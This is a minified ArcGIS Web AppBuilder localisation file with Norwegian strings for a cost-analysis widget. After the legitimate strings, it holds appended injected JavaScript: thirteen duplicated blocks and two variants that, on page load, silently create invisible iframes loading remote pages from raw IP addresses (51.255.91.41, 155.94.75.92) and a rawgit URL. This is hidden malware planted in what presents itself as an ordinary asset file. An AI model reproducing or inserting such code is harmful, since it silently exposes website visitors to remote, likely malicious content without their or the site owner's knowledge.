// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Angi konfigurasjonstekst:",generalSettings:{tabTitle:"Generelle innstillinger",measurementUnitLabel:"M\u00e5leenhet",currencyLabel:"M\u00e5lesymbol",roundCostLabel:"Avrundet kostnad",projectOutputSettings:"Innstillinger for prosjektutdata",typeOfProjectAreaLabel:"Type prosjektomr\u00e5de",bufferDistanceLabel:"Bufferavstand",roundCostValues:{twoDecimalPoint:"To desimaler",nearestWholeNumber:"N\u00e6rmeste hele tall",nearestTen:"N\u00e6rmeste tier",
nearestHundred:"N\u00e6rmeste hundrer",nearestThousand:"N\u00e6rmeste tusener",nearestTenThousands:"N\u00e6rmeste titusener"},projectAreaType:{outline:"Omriss",buffer:"Lag buffer"},errorMessages:{currency:"Ugyldig valutaenhet",bufferDistance:"Ugyldig bufferavstand",outOfRangebufferDistance:"Verdien m\u00e5 v\u00e6re st\u00f8rre enn 0 og mindre enn eller lik 100"}},projectSettings:{tabTitle:"Prosjektinnstillinger",costingGeometrySectionTitle:"Definer geografi for kostnadsberegning (valgfritt)",costingGeometrySectionNote:"Merk: Konfigurasjon av dette laget gj\u00f8r det mulig for brukeren \u00e5 angi kostnadsligninger for geoobjektmaler basert p\u00e5 geografi.",
projectTableSectionTitle:"Mulighet for \u00e5 lagre / laste inn prosjektinnstillinger (valgfritt)",projectTableSectionNote:"Merk: Konfigurasjon av alle tabeller og lag gj\u00f8r det mulig for brukeren \u00e5 lagre / laste inn prosjekter for senere bruk.",costingGeometryLayerLabel:"Geometrilag for kostnadsberegning",fieldLabelGeography:"Felt-til-etikett-geografi",projectAssetsTableLabel:"Tabell over prosjektressurser",projectMultiplierTableLabel:"Tabell over multiplikator for tilleggskostnad for prosjekt",
projectLayerLabel:"Prosjektlag",configureFieldsLabel:"Konfigurer felt",fieldDescriptionHeaderTitle:"Feltbeskrivelse",layerFieldsHeaderTitle:"Lagfelt",selectLabel:"Velg",errorMessages:{duplicateLayerSelection:"${layerName} er allerede valgt",invalidConfiguration:"Velg ${fieldsString}"},costingGeometryHelp:"\x3cp\x3ePolygonlag med f\u00f8lgende betingelser vises: \x3cbr/\x3e \x3cli\x3e\tLaget m\u00e5 ha en sp\u00f8rringsfunksjon\x3c/li\x3e\x3cli\x3e\tLaget m\u00e5 ha et GlobalID-felt\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eStrengen og de numeriske feltene for det valgte geometrilaget for kostnadsberegning vises i rullegardinlisten Felt-til-etikett-geografi.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eTabell(er) med f\u00f8lgende betingelser vises: \x3cbr/\x3e \x3cli\x3eTabellen m\u00e5 ha redigeringsfunksjoner, n\u00e6rmere bestemt Opprett, Slett og Oppdater\x3c/li\x3e    \x3cli\x3eTabellen m\u00e5 ha seks felt med n\u00f8yaktig navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID-typefelt)\x3c/li\x3e\x3cli\x3e\tCostEquation (strengtypefelt)\x3c/li\x3e\x3cli\x3e\tScenario (strengtypefelt)\x3c/li\x3e\x3cli\x3e\tTemplateName (strengtypefelt)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID-typefelt)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID-typefelt)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabell(er) med f\u00f8lgende betingelser vises: \x3cbr/\x3e \x3cli\x3eTabellen m\u00e5 ha redigeringsfunksjoner, n\u00e6rmere bestemt Opprett, Slett og Oppdater\x3c/li\x3e    \x3cli\x3eTabellen m\u00e5 ha fem felt med n\u00f8yaktig navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (strengtypefelt)\x3c/li\x3e\x3cli\x3e\tType (strengtypefelt)\x3c/li\x3e\x3cli\x3e\tValue (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3e\tCostindex (heltallstypefelt)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID-typefelt))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3ePolygonlag med f\u00f8lgende betingelser vises: \x3cbr/\x3e \x3cli\x3eLaget m\u00e5 ha redigeringsfunksjoner, n\u00e6rmere bestemt Opprett, Slett og Oppdater\x3c/li\x3e    \x3cli\x3eLaget m\u00e5 ha fem felt med n\u00f8yaktig navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (strengtypefelt)\x3c/li\x3e\x3cli\x3eDescription (strengtypefelt)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID-typefelt)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Laginnstillinger",layerNameHeaderTitle:"Lagnavn",layerNameHeaderTooltip:"Liste over lag i kartet",EditableLayerHeaderTitle:"Redigerbar",EditableLayerHeaderTooltip:"Inkluder laget og malene i widgeten for kostnadsberegning",SelectableLayerHeaderTitle:"Kan velges",SelectableLayerHeaderTooltip:"Geometrien fra geoobjektet kan brukes til \u00e5 generere et nytt kostnadselement",fieldPickerHeaderTitle:"Prosjekt-ID (valgfritt)",fieldPickerHeaderTooltip:"Valgfritt felt (for strengtypen) for lagring av Prosjekt-ID i",
selectLabel:"Velg",noAssetLayersAvailable:"Finner ingen ressurslag i valgt webkart",disableEditableCheckboxTooltip:"Dette laget har ikke redigeringsfunksjoner"},costingInfo:{tabTitle:"Kostnadsberegningsinformasjon",proposedMainsLabel:"Foresl\u00e5tt hovedledning",addCostingTemplateLabel:"Legg til kostnadsberegningsmal",manageScenariosTitle:"Administrer scenarioer",featureTemplateTitle:"Geoobjektmal",costEquationTitle:"Kostnadsligning",geographyTitle:"Geografi",scenarioTitle:"Scenario",actionTitle:"Handlinger",
scenarioNameLabel:"Scenarionavn",addBtnLabel:"Legg til",srNoLabel:"Nei.",deleteLabel:"Slett",duplicateScenarioName:"Dupliser scenarionavn",hintText:"\x3cdiv\x3eTips: Bruk f\u00f8lgende n\u00f8kkelord\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Bruker det totale antallet av samme type ressurs i en geografi\x3c/li\x3e \x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Bruker lengde for linjeressurs og areal for polygonressurs\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Bruker den samlede lengden for linjeressursen og det samlede arealet for polygonressursen av samme type i en geografi\x3c/li\x3e\x3c/ul\x3eDu kan bruke funksjoner som:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eRediger kostnadsligningen ut fra prosjektbehovene dine.",
noneValue:"Ingen",requiredCostEquation:"Ugyldig kostnadsligning for ${layerName} : ${templateName}",duplicateTemplateMessage:"Duplisert maloppf\u00f8ring finnes for ${layerName} : ${templateName}",defaultEquationRequired:"Standardligning kreves for ${layerName} : ${templateName}",validCostEquationMessage:"Angi en gyldig kostnadsligning",costEquationHelpText:"Rediger kostnadsligningen ut fra prosjektbehovene dine",scenarioHelpText:"Velg scenario ut fra prosjektbehovene dine",copyRowTitle:"Kopier rad",
noTemplateAvailable:"Legg til minst \u00e9n mal for ${layerName}",manageScenarioLabel:"Administrer scenario",noLayerMessage:"Angi minst ett lag i ${tabName}",noEditableLayersAvailable:"Lag(ene) skal merkes som redigerbare i fanen med laginnstillinger"},statisticsSettings:{tabTitle:"Statistikkinnstillinger",addStatisticsLabel:"Legg til statistikk",fieldNameTitle:"Felt",statisticsTitle:"Etikett",addNewStatisticsText:"Legg til ny statistikk",deleteStatisticsText:"Slett statistikk",moveStatisticsUpText:"Flytt statistikk opp",
moveStatisticsDownText:"Flytt statistikk ned",selectDeselectAllTitle:"Merk alle"},statisticsType:{countLabel:"Antall",averageLabel:"Gjennomsnitt",maxLabel:"Maksimum",minLabel:"Minimum",summationLabel:"Summering",areaLabel:"Areal",lengthLabel:"Lengde"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});